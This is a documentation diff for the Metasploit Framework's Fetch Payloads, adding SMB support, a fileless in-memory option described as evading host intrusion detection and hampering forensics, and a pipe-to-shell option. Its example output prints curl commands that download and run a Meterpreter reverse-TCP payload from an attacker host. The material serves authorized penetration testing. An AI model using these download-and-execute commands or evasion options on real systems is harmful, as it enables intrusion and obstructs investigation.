@@ -24,7 +24,7 @@ cURL, or Certutil.
 
 ## Organization
 Unlike Command Stagers which are organized by binary, Fetch Payloads are organized by server. Currently, we support
-HTTP, HTTPS, and TFTP servers.  Once you select a fetch payload, you can select the binary you'd like to run on the
+HTTP, HTTPS, SMB, and TFTP servers.  Once you select a fetch payload, you can select the binary you'd like to run on the
 remote host to download the served payload prior to execution.
 
 Here is the naming convention for fetch payloads:
@@ -69,15 +69,36 @@ msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) >
 `FETCH_COMMAND` is the binary we wish to run on the remote host to download the adapted payload.  Currently, the
 supported options are `CURL FTP TFTP TNFTP WGET` on Linux hosts and `CURL TFTP CERTUTIL` on Windows hosts.  We'll get
 into more details on the binaries later.
-`FETCH_FILENAME` is the name you'd like the executable payload saved as on the remote host.  This option is not
-supported by every binary and must end in `.exe` on Windows hosts.  The default value is random.
+
 `FETCH_SRVHOST` is the IP where the server will listen.
+
 `FETCH_SRVPORT` is the port where the server will listen.
+
 `FETCH_URIPATH` is the URI corresponding to the payload file.  The default value is deterministic based on the
 underlying payload so a payload created in msfvenom will match a listener started in Framework assuming the underlying
 served payload is the same.
+
+### Dependent Options
+`FETCH_FILELESS` is an option that specifies a method to modify the fetch command to download the binary payload to
+memory rather than disk before execution, thus avoiding some HIDS and making forensics harder.  Currently, there are
+two options: `bash` and `python3.8+`.  Both of these require the target to be running Linux Kernel 3.17 or above.
+This option is only available when the platform is Linux.
+
+`FETCH_FILENAME` is the name you'd like the executable payload saved as on the remote host.  This option is not
+supported by every binary and must end in `.exe` on Windows hosts.  The default value is random.
+This option is only available when `FETCH_FILELESS` is set to `none`
+
+`FETCH_PIPE` is a binary flag that will create a second resource containing the original fetch command to run and then
+will produce a much shorter command to run on the host that will download the original fetch command and pipe it
+directly to the target's shell.  Use this option if there is a limit on the command size as it will result in a much
+smaller original command.  When set to true, the `FETCH_URIPATH` option is used for the pipe command resource uri and
+the default `FETCH_URIPATH`value is used for the original binary payload uri.
+This option is only available when the fetch  transport is HTTP or HTTPS and the payload platform is Linux with the 
+`FETCH_COMMAND` set to `CURL` or `WGET` or the platform is Windows and the `FETCH_COMMAND` is `CURL`
+
 `FETCH_WRITABLE_DIR` is the directory on the remote host where we'd like to store the served payload prior to execution.
-This value is not supported by all binaries.  If you set this value and it is not supported, it will generate an error.
+This value is not supported by all fetch binaries.  If you set this value and it is not supported, it will generate an error.
+This option is only available when `FETCH_FILELESS` is set to `none`
 
 The remaining options will be the options available to you in the served payload; in this case our served payload is
 `linux/x64/meterpreter/reverse_tcp` so our only added options are `LHOST` and `LPORT`.  If we had selected a different
@@ -153,6 +174,20 @@ without relying on a session in framework or having to get a payload on target. 
 really odd situation where you can execute commands, you can get a session in framework quickly without having to upload
 a payload manually.  Just follow the steps above, and run the provided command.  Right now, the only thing we serve are
 Framework payloads, but in the future, expanding to serve and execute any executable binary would be relatively trivial.
+
+## Fetch Pipe
+If space is at a premium, you can use the `FETCH_PIPE` option.  When using `FETCH_PIPE`, the fetch server hosts two
+resources: the original binary and then the generated fetch command.  In the place of the original command, the command
+generated will be a much smaller command to download the original command and pipe it into the shell.
+The following example shows both the original command to download and execute the binary and the command to pipe the
+original fetch command directly to the shell.  Since this requires two downloads, it is less stealthy, but the
+command to run on the target is significantly shorter.
+``` msf
+msf6 payload(cmd/windows/http/x64/meterpreter_reverse_tcp) > to_handler
+[*] Command served: curl -so %TEMP%\DpRdBIfeyax.exe http://10.5.135.117:8080/zw3LGTh9FtaLJ4bCQRAWdw & start /B %TEMP%\DpRdBIfeyax.exe
+
+[*] Command to run on remote host: curl -s http://10.5.135.117:8080/test|cmd
+```
 
 ## Using it in an exploit
 Using Fetch Payloads is no different than using any other command payload.  First, give users access to the Fetch
